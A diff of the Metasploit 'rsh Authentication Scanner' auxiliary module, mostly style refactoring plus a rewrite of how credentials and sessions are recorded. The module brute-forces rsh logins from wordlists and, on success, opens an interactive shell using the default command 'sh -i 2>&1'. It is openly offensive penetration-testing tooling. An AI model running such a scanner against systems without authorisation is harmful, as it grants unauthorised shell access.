@@ -10,34 +10,36 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::RServices
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::CommandShell
+  include Msf::Sessions::CreateSessionOptions
+  include Msf::Auxiliary::ReportSummary
 
   def initialize
     super(
-      'Name'        => 'rsh Authentication Scanner',
+      'Name' => 'rsh Authentication Scanner',
       'Description' => %q{
           This module will test a shell (rsh) service on a range of machines and
         report successful logins.
 
         NOTE: This module requires access to bind to privileged ports (below 1024).
       },
-      'References' =>
-        [
-          [ 'CVE', '1999-0651' ],
-          [ 'CVE', '1999-0502'] # Weak password
-        ],
-      'Author'      => [ 'jduck' ],
-      'License'     => MSF_LICENSE
+      'References' => [
+        [ 'CVE', '1999-0651' ],
+        [ 'CVE', '1999-0502'] # Weak password
+      ],
+      'Author' => [ 'jduck' ],
+      'License' => MSF_LICENSE
     )
 
     register_options(
       [
         Opt::RPORT(514),
         OptBool.new('ENABLE_STDERR', [ true, 'Enables connecting the stderr port', false ])
-      ])
+      ]
+    )
   end
 
   def run_host(ip)
-    print_status("#{ip}:#{rport} - Starting rsh sweep")
+    print_status('Starting rsh sweep')
 
     cmd = datastore['CMD']
     cmd ||= 'sh -i 2>&1'
@@ -49,6 +51,7 @@ class MetasploitModule < Msf::Auxiliary
       if not ret
         return :abort
       end
+
       sd, lport = ret
     else
       sd = lport = nil
@@ -64,7 +67,6 @@ class MetasploitModule < Msf::Auxiliary
     sd.close if sd
   end
 
-
   def each_user_fromuser(&block)
     # Class variables to track credential use (for threading)
     @@credentials_tried = {}
@@ -73,7 +75,7 @@ class MetasploitModule < Msf::Auxiliary
     credentials = extract_word_pair(datastore['USERPASS_FILE'])
 
     users = load_user_vars()
-    credentials.each { |u,p| users << u }
+    credentials.each { |u, p| users << u }
     users.uniq!
 
     fromusers = load_fromuser_vars()
@@ -85,8 +87,7 @@ class MetasploitModule < Msf::Auxiliary
 
     fq_rest = "%s:%s:%s" % [datastore['RHOST'], datastore['RPORT'], "all remaining users"]
 
-    credentials.each do |u,fu|
-
+    credentials.each do |u, fu|
       break if @@credentials_skipped[fq_rest]
 
       fq_user = "%s:%s:%s" % [datastore['RHOST'], datastore['RPORT'], u]
@@ -118,9 +119,8 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-
   def do_login(user, luser, cmd, sfd, lport)
-    vprint_status("#{target_host}:#{rport} - Attempting rsh with username '#{user}' from '#{luser}'")
+    vprint_status("Attempting rsh with username '#{user}' from '#{luser}'")
 
     # We must connect from a privileged port.
     this_attempt ||= 0
@@ -129,10 +129,11 @@ class MetasploitModule < Msf::Auxiliary
       if this_attempt > 0
         # power of 2 back-off
         select(nil, nil, nil, 2**this_attempt)
-        vprint_error "#{rhost}:#{rport} rsh - Retrying '#{user}' from '#{luser}' due to reset"
+        vprint_error "rsh - Retrying '#{user}' from '#{luser}' due to reset"
       end
       ret = connect_from_privileged_port
       break if ret == :connected
+
       this_attempt += 1
     end
 
@@ -163,28 +164,27 @@ class MetasploitModule < Msf::Auxiliary
       if buf.nil?
         return :failed
       end
+
       result = buf.gsub(/[[:space:]]+/, ' ')
       vprint_error("Result: #{result}")
       return :skip_user if result =~ /locuser too long/
+
       return :failed
     end
 
     # should we report a vuln here? rsh allowed w/o password?!
-    print_good("#{target_host}:#{rport}, rsh '#{user}' from '#{luser}' with no password.")
+    print_good("rsh '#{user}' from '#{luser}' with no password.")
     start_rsh_session(rhost, rport, user, luser, buf, stderr_sock)
 
     return :next_user
 
   # For debugging only.
-  #rescue ::Exception
+  # rescue ::Exception
   #	print_error("#{$!}")
   #	return :abort
-
   ensure
     disconnect()
-
   end
-
 
   #
   # This is only needed by RSH so it is not in the rservices mixin
@@ -193,17 +193,16 @@ class MetasploitModule < Msf::Auxiliary
     lport = 1023
     sd = nil
     while lport > 512
-      #vprint_status("Trying to listen on port #{lport} ..")
+      # vprint_status("Trying to listen on port #{lport} ..")
       sd = nil
       begin
         sd = Rex::Socket.create_tcp_server('LocalPort' => lport)
-
       rescue Rex::BindFailed
         # Ignore and try again
-
       end
 
       break if sd
+
       lport -= 1
     end
 
@@ -213,7 +212,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     add_socket(sd)
-    #print_status("Listening on port #{lport}")
+    # print_status("Listening on port #{lport}")
     [ sd, lport ]
   end
 
@@ -244,29 +243,33 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def start_rsh_session(host, port, user, luser, proof, stderr_sock)
-    report_auth_info(
-      :host	=> host,
-      :port	=> port,
-      :sname => 'shell',
-      :user	=> user,
-      :luser => luser,
-      :proof  => proof,
-      :source_type => "user_supplied",
-      :active => true
-    )
-
-    merge_me = {
-      'USER_FILE'     => nil,
-      'FROMUSER_FILE' => nil,
-      'USERNAME'      => user,
-      'FROMUSER'      => user,
-      # Save a reference to the socket so we don't GC prematurely
-      :stderr_sock    => stderr_sock
+    service_data = {
+      address: host,
+      port: port,
+      service_name: 'shell',
+      proof: proof,
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
     }
 
-    # Don't tie the life of this socket to the exploit
-    self.sockets.delete(stderr_sock)
+    credential_data = {
+      module_fullname: self.fullname,
+      origin_type: :service,
+      username: user,
+      # Save a reference to the socket so we don't GC prematurely
+      stderr_sock: stderr_sock
+    }.merge(service_data)
 
-    start_session(self, "RSH #{user} from #{luser} (#{host}:#{port})", merge_me) if datastore['CreateSession']
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED
+    }.merge(service_data)
+
+    if datastore['CreateSession']
+      start_session(self, "RSH #{user} from #{luser} (#{host}:#{port})", login_data, nil, self.sock)
+      # Don't tie the life of this socket to the exploit
+      self.sockets.delete(stderr_sock)
+      self.sock = nil
+    end
   end
 end
